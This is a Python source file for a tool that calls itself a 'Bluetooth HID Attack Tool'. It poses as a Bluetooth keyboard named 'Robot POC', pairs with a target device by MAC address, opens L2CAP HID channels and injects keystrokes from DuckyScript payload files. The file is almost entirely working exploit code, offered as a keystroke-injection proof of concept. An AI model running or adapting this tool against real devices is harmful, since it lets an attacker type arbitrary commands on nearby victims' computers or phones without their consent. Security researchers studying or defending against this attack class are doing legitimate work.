# main.py

import binascii
import bluetooth
import sys
import time
import datetime
import logging
import argparse
from multiprocessing import Process
from pydbus import SystemBus
from enum import Enum
import subprocess
import os

from utils.menu_functions import (read_duckyscript, run, restart_bluetooth_daemon, scan_for_devices, main_menu, is_valid_mac_address)
from utils.register_device import register_hid_profile, agent_loop
from utils.key_codes import Key_Codes, Modifier_Codes

child_processes = []

class AnsiColorCode:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

NOTICE_LEVEL = 25

class ColorLogFormatter(logging.Formatter):
    COLOR_MAP = {
        logging.DEBUG: AnsiColorCode.BLUE,
        logging.INFO: AnsiColorCode.GREEN,
        logging.WARNING: AnsiColorCode.YELLOW,
        logging.ERROR: AnsiColorCode.RED,
        logging.CRITICAL: AnsiColorCode.RED,
        NOTICE_LEVEL: AnsiColorCode.BLUE,
    }

    def format(self, record):
        color = self.COLOR_MAP.get(record.levelno, AnsiColorCode.WHITE)
        message = super().format(record)
        return f'{color}{message}{AnsiColorCode.RESET}'

def notice(self, message, *args, **kwargs):
    if self.isEnabledFor(NOTICE_LEVEL):
        self._log(NOTICE_LEVEL, message, args, **kwargs)

logging.addLevelName(NOTICE_LEVEL, "NOTICE")
logging.Logger.notice = notice

def setup_logging():
    log_format = "%(asctime)s - %(levelname)s - %(message)s"
    formatter = ColorLogFormatter(log_format)
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logging.basicConfig(level=logging.INFO, handlers=[handler])

class ConnectionFailureException(Exception):
    pass

class Adapter:
    def __init__(self, iface):
        self.iface = iface
        self.bus = SystemBus()
        self.adapter = self._get_adapter(iface)

    def _get_adapter(self, iface):
        try:
            return self.bus.get("org.bluez", f"/org/bluez/{iface}")
        except KeyError:
            log.error(f"Unable to find adapter '{iface}', aborting.")
            raise ConnectionFailureException("Adapter not found")

    def _run_command(self, command):
        result = run(command)
        if result.returncode != 0:
            raise ConnectionFailureException(f"Failed to execute command: {' '.join(command)}. Error: {result.stderr}")

    def set_property(self, prop, value):
        value_str = str(value) if not isinstance(value, str) else value
        command = ["sudo", "hciconfig", self.iface, prop, value_str]
        self._run_command(command)
        verify_command = ["hciconfig", self.iface, prop]
        verification_result = run(verify_command)
        if value_str not in verification_result.stdout:
            log.error(f"Unable to set adapter {prop}, aborting. Output: {verification_result.stdout}")
            raise ConnectionFailureException(f"Failed to set {prop}")

    def power(self, powered):
        self.adapter.Powered = powered

    def reset(self):
        self.power(False)
        self.power(True)

    def enable_ssp(self):
        try:
            ssp_command = ["sudo", "hciconfig", self.iface, "sspmode", "1"]
            ssp_result = run(ssp_command)
            if ssp_result.returncode != 0:
                log.error(f"Failed to enable SSP: {ssp_result.stderr}")
                raise ConnectionFailureException("Failed to enable SSP")
        except Exception as e:
            log.error(f"Error enabling SSP: {e}")
            raise

class PairingAgent:
    def __init__(self, iface, target_addr):
        self.iface = iface
        self.target_addr = target_addr
        dev_name = "dev_%s" % target_addr.upper().replace(":", "_")
        self.target_path = "/org/bluez/%s/%s" % (iface, dev_name)

    def __enter__(self):
        try:
            log.debug("Starting agent process...")
            self.agent = Process(target=agent_loop, args=(self.target_path,))
            self.agent.start()
            time.sleep(0.25)
            log.debug("Agent process started.")
            return self
        except Exception as e:
            log.error(f"Error starting agent process: {e}")
            raise

    def __exit__(self, exc_type, exc_val, exc_tb):
        try:
            log.debug("Terminating agent process...")
            self.agent.kill()
            time.sleep(2)
            log.debug("Agent process terminated.")
        except Exception as e:
            log.error(f"Error terminating agent process: {e}")
            raise

class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        try:
            return sum(client.connect() for client in self.clients.values())
        except ConnectionFailureException as e:
            log.error(f"Connection failure: {e}")
            raise

    def close_all(self):
        for client in self.clients.values():
            client.close()

class ReconnectionRequiredException(Exception):
    def __init__(self, message, current_line=0, current_position=0):
        super().__init__(message)
        time.sleep(2)
        self.current_line = current_line
        self.current_position = current_position

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None

    @staticmethod
    def encode_keyboard_input(*args):
        keycodes = []
        flags = 0
        for a in args:
            if isinstance(a, Key_Codes):
                keycodes.append(a.value)
            elif isinstance(a, Modifier_Codes):
                flags |= a.value
        assert(len(keycodes) <= 7)
        keycodes += [0] * (7 - len(keycodes))
        report = bytes([0xA1, 0x01, flags, 0x00] + keycodes)
        return report

    def close(self):
        if self.connected:
            self.sock.close()
        self.connected = False
        self.sock = None

    def reconnect(self):
        raise ReconnectionRequiredException("Reconnection required")

    def send(self, data):
        if not self.connected:
            log.error("[TX] Not connected")
            self.reconnect()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log.debug(f"[{timestamp}][TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
        try:
            self.attempt_send(data)
            log.debug(f"[TX-{self.port}] Data sent successfully")
        except bluetooth.btcommon.BluetoothError as ex:
            log.error(f"[TX-{self.port}] Bluetooth error: {ex}")
            self.reconnect()
            self.send(data)
        except Exception as ex:
            log.error(f"[TX-{self.port}] Exception: {ex}")
            raise

    def attempt_send(self, data, timeout=0.5):
        start = time.time()
        while time.time() - start < timeout:
            try:
                self.sock.send(data)
                return
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:
                    raise
                time.sleep(0.001)

    def recv(self, timeout=0):
        start = time.time()
        while True:
            raw = None
            if not self.connected:
                return None
            if self.sock is None:
                return None
            try:
                raw = self.sock.recv(64)
                if len(raw) == 0:
                    self.connected = False
                    return None
                log.debug(f"[RX-{self.port}] Received data: {binascii.hexlify(raw).decode()}")
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:
                    raise ex
                else:
                    if (time.time() - start) < timeout:
                        continue
            return raw

    def connect(self, timeout=None):
        log.debug(f"Attempting to connect to {self.addr} on port {self.port}")
        log.info(f"Connecting to {self.addr} on port {self.port}")
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(timeout)
        try:
            sock.connect((self.addr, self.port))
            sock.setblocking(0)
            self.sock = sock
            self.connected = True
            log.debug(f"SUCCESS! Connected on port {self.port}")
        except Exception as ex:
            red = "\033[91m"
            blue = "\033[94m"
            reset = "\033[0m"
            error = True
            self.connected = False
            log.error(f"ERROR connecting on port {self.port}: {ex}")
            raise ConnectionFailureException(f"Connection failure on port {self.port}")
            if (error and self.port == 14):
                print(f"{reset}[{red}!{reset}] {red}CRITICAL ERROR{reset}: Attempted Connection to {red}{self.addr} {reset}was {red}denied{reset}.")
                return self.connected
        return self.connected

    def send_keyboard_report(self, *args):
        self.send(self.encode_keyboard_input(*args))

    def send_keypress(self, *args, delay=0.0001):
        if args:
            log.debug(f"Attempting to send... {args}")
            self.send(self.encode_keyboard_input(*args))
            time.sleep(delay)
            self.send(self.encode_keyboard_input())
            time.sleep(delay)
        else:
            self.send(self.encode_keyboard_input())
        time.sleep(delay)
        return True

    def send_keyboard_combination(self, modifier, key, delay=0.004):
        press_report = self.encode_keyboard_input(modifier, key)
        self.send(press_report)
        time.sleep(delay)
        release_report = self.encode_keyboard_input()
        self.send(release_report)
        time.sleep(delay)

def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
    client.send_keypress('')
    time.sleep(0.5)
    shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    try:
        for line_number, line in enumerate(duckyscript):
            if line_number < current_line:
                continue
            if line_number == current_line and current_position > 0:
                line = line[current_position:]
            else:
                current_position = 0
            line = line.strip()
            log.info(f"Processing: {line}")
            if not line or line.startswith("REM"):
                continue
            if line.startswith("TAB"):
                client.send_keypress(Key_Codes.TAB)
            if line.startswith("PRIVATE_BROWSER"):
                report = bytes([
                    0xA1, 0x01, 
                    Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 
                    0x00, 
                    Key_Codes.n.value, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                ])
                client.send(report)
                release_report = bytes([0xA1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                client.send(release_report)
            if line.startswith("VOLUME_UP"):
                hid_report_gui_v = bytes.fromhex("a1010800190000000000")
                client.send(hid_report_gui_v)
                time.sleep(0.1)
                client.send_keypress(Key_Codes.TAB)
                hid_report_up = bytes.fromhex("a1010800195700000000")
                client.send(hid_report_up)
                time.sleep(0.1)
                hid_report_release = bytes.fromhex("a1010000000000000000")
                client.send(hid_report_release)
            if line.startswith("DELAY"):
                try:
                    delay_time = int(line.split()[1])
                    time.sleep(delay_time / 1000)
                except ValueError:
                    log.error(f"Invalid DELAY format in line: {line}")
                except IndexError:
                    log.error(f"DELAY command requires a time parameter in line: {line}")
                continue
            if line.startswith("STRING"):
                text = line[7:]
                for char_position, char in enumerate(text, start=1):
                    log.notice(f"Attempting to send letter: {char}")
                    try:
                        if char.isdigit():
                            key_code = getattr(Key_Codes, f"_{char}")
                            client.send_keypress(key_code)
                        elif char == " ":
                            client.send_keypress(Key_Codes.SPACE)
                        elif char == "[":
                            client.send_keypress(Key_Codes.LEFTBRACE)
                        elif char == "]":
                            client.send_keypress(Key_Codes.RIGHTBRACE)
                        elif char == ";":
                            client.send_keypress(Key_Codes.SEMICOLON)
                        elif char == "'":
                            client.send_keypress(Key_Codes.QUOTE)
                        elif char == "/":
                            client.send_keypress(Key_Codes.SLASH)
                        elif char == ".":
                            client.send_keypress(Key_Codes.DOT)
                        elif char == ",":
                            client.send_keypress(Key_Codes.COMMA)
                        elif char == "|":
                            client.send_keypress(Key_Codes.PIPE)
                        elif char == "-":
                            client.send_keypress(Key_Codes.MINUS)
                        elif char == "=":
                            client.send_keypress(Key_Codes.EQUAL)
                        elif char in shift_required_characters:
                            key_code_str = char_to_key_code(char)
                            if key_code_str:
                                key_code = getattr(Key_Codes, key_code_str)
                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                            else:
                                log.warning(f"Unsupported character '{char}' in Duckyscript")
                        elif char.isalpha():
                            key_code = getattr(Key_Codes, char.lower())
                            if char.isupper():
                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                            else:
                                client.send_keypress(key_code)
                        else:
                            key_code = char_to_key_code(char)
                            if key_code:
                                client.send_keypress(key_code)
                            else:
                                log.warning(f"Unsupported character '{char}' in Duckyscript")
                        current_position = char_position
                    except AttributeError as e:
                        log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")
            elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
                components = line.split()
                if len(components) == 2:
                    modifier, key = components
                    try:
                        modifier_enum = getattr(Modifier_Codes, modifier.upper())
                        key_enum = getattr(Key_Codes, key.lower())
                        client.send_keyboard_combination(modifier_enum, key_enum)
                        log.notice(f"Sent combination: {line}")
                    except AttributeError:
                        log.warning(f"Unsupported combination: {line}")
                else:
                    log.warning(f"Invalid combination format: {line}")
            elif line.startswith("ENTER"):
                client.send_keypress(Key_Codes.ENTER)
            current_position = 0  
            current_line += 1  
    except ReconnectionRequiredException:
        raise ReconnectionRequiredException("Reconnection required", current_line, current_position)
    except Exception as e:
        log.error(f"Error during script execution: {e}")

def char_to_key_code(char):
    shift_char_map = {
        '!': 'EXCLAMATION_MARK',
        '@': 'AT_SYMBOL',
        '#': 'HASHTAG',
        '$': 'DOLLAR',
        '%': 'PERCENT_SYMBOL',
        '^': 'CARET_SYMBOL',
        '&': 'AMPERSAND_SYMBOL',
        '*': 'ASTERISK_SYMBOL',
        '(': 'OPEN_PARENTHESIS',
        ')': 'CLOSE_PARENTHESIS',
        '_': 'UNDERSCORE_SYMBOL',
        '+': 'KEYPADPLUS',
        '{': 'LEFTBRACE',
        '}': 'RIGHTBRACE',
        ':': 'SEMICOLON',
        '\\': 'BACKSLASH',
        '"': 'QUOTE',
        '<': 'COMMA',
        '>': 'DOT',
        '?': 'QUESTIONMARK',
        'A': 'a',
        'B': 'b',
        'C': 'c',
        'D': 'd',
        'E': 'e',
        'F': 'f',
        'G': 'g',
        'H': 'h',
        'I': 'i',
        'J': 'j',
        'K': 'k',
        'L': 'l',
        'M': 'm',
        'N': 'n',
        'O': 'o',
        'P': 'p',
        'Q': 'q',
        'R': 'r',
        'S': 's',
        'T': 't',
        'U': 'u',
        'V': 'v',
        'W': 'w',
        'X': 'x',
        'Y': 'y',
        'Z': 'z',
    }
    return shift_char_map.get(char)

def terminate_child_processes():
    for proc in child_processes:
        if proc.is_alive():
            proc.terminate()
            proc.join()

def setup_bluetooth(target_address, adapter_id):
    restart_bluetooth_daemon()
    profile_proc = Process(target=register_hid_profile, args=(adapter_id, target_address))
    profile_proc.start()
    child_processes.append(profile_proc)
    adapter = Adapter(adapter_id)
    adapter.set_property("name", "Robot POC")
    adapter.set_property("class", 0x002540)
    adapter.power(True)
    return adapter

def initialize_pairing(agent_iface, target_address):
    try:
        with PairingAgent(agent_iface, target_address) as agent:
            log.debug("Pairing agent initialized")
    except Exception as e:
        log.error(f"Failed to initialize pairing agent: {e}")
        raise ConnectionFailureException("Pairing agent initialization failed")

def establish_connections(connection_manager):
    if not connection_manager.connect_all():
        raise ConnectionFailureException("Failed to connect to all required ports")

def setup_and_connect(connection_manager, target_address, adapter_id):
    connection_manager.create_connection(1)
    connection_manager.create_connection(17)
    connection_manager.create_connection(19)
    initialize_pairing(adapter_id, target_address)
    establish_connections(connection_manager)
    return connection_manager.clients[19]

def troubleshoot_bluetooth():
    blue = "\033[0m"
    red = "\033[91m"
    reset = "\033[0m"
    try:
        subprocess.run(['bluetoothctl', '--version'], check=True, stdout=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print(f"{reset}[{red}!{reset}] {red}CRITICAL{reset}: {blue}bluetoothctl {reset}is not installed or not working properly.")
        return False
    result = subprocess.run(['bluetoothctl', 'list'], capture_output=True, text=True)
    if "Controller" not in result.stdout:
        print(f"{reset}[{red}!{reset}] {red}CRITICAL{reset}: No {blue}Bluetooth adapters{reset} have been detected.")
        return False
    result = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
    if "Device" not in result.stdout:
        print(f"{reset}[{red}!{reset}] {red}CRITICAL{reset}: No Compatible {blue}Bluetooth devices{reset} are connected.")
        return False
    return True

def main():
    blue = "\033[0m"
    red = "\033[91m"
    reset = "\033[0m"
    parser = argparse.ArgumentParser(description="Bluetooth HID Attack Tool")
    parser.add_argument('--adapter', type=str, default='hci0', help='Specify the Bluetooth adapter to use (default: hci0)')
    args = parser.parse_args()
    adapter_id = args.adapter

    main_menu()

    # Get target address using updated menu_functions.py
    target_address = get_target_address()
    if not target_address:
        log.info("No target address provided. Exiting..")
        return

    script_directory = os.path.dirname(os.path.realpath(__file__))
    payload_folder = os.path.join(script_directory, 'payloads/')
    try:
        payloads = os.listdir(payload_folder)
    except FileNotFoundError:
        print(f"{red}Payload folder not found at {payload_folder}. Exiting.{reset}")
        return

    if not payloads:
        print(f"{red}No payloads found in the payloads folder. Exiting.{reset}")
        return

    print(f"\nAvailable payloads\033[94m:")
    for idx, payload_file in enumerate(payloads, 1):
        print(f"{reset}[{blue}{idx}{reset}]\033[94m: {reset}{payload_file}")

    payload_choice = input(f"\n\033[94mEnter the number that represents the payload you would like to load\033[0m: \033[94m")
    selected_payload = None
    try:
        payload_index = int(payload_choice) - 1
        selected_payload = os.path.join(payload_folder, payloads[payload_index])
    except (ValueError, IndexError):
        print(f"Invalid payload choice. No payload selected.")

    if selected_payload is not None:
        print(f"\033[94mSelected payload\033[0m: \033[94m{selected_payload}\033[0m")
        duckyscript = read_duckyscript(selected_payload)
    else:
        print(f"\033[91mNo payload selected.\033[0m")
        duckyscript = None

    if not duckyscript:
        log.info("Payload file not found or empty. Exiting.")
        return

    adapter = setup_bluetooth(target_address, adapter_id)
    adapter.enable_ssp()

    current_line = 0
    current_position = 0
    connection_manager = L2CAPConnectionManager(target_address)

    while True:
        try:
            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
            time.sleep(2)
            break
        except ReconnectionRequiredException as e:
            log.info(f"\033[0mReconnection required. Attempting to reconnect\033[94m...")
            current_line = e.current_line
            current_position = e.current_position
            connection_manager.close_all()
            time.sleep(2)
        finally:
            blue = "\033[94m"
            reset = "\033[0m"
            command = f'echo -e "remove {target_address}\n" | bluetoothctl'
            subprocess.run(command, shell=True)
            print(f"{blue}Successfully Removed device{reset}: {blue}{target_address}{reset}")

if __name__ == "__main__":
    setup_logging()
    log = logging.getLogger(__name__)
    try:
        if troubleshoot_bluetooth():
            main()
        else:
            sys.exit(0)
    finally:
        terminate_child_processes()
